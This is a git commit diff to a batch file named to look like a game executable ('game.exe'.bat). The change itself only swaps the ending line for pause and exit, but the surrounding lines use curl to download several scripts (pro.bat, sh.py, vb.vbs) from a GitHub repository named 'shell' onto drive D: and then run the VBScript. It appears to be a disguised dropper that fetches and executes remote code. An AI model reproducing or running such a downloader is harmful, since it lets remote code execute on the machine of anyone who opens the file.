0be272c964afebc7157f90d41e64cadc0de7470f
Omar Samy <osamy7592@gmail.com>
2024-05-01 14:29:08 +0300

    Update 'game.exe'.bat

--- 'game.exe'.bat
+++ 'game.exe'.bat
@@ -3,5 +3,6 @@ curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.b
 curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o  D:\sh.py
 curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o  D:\vb.vbs
 call D:\vb.vbs
-goto :EOF
+pause
+exit 
 
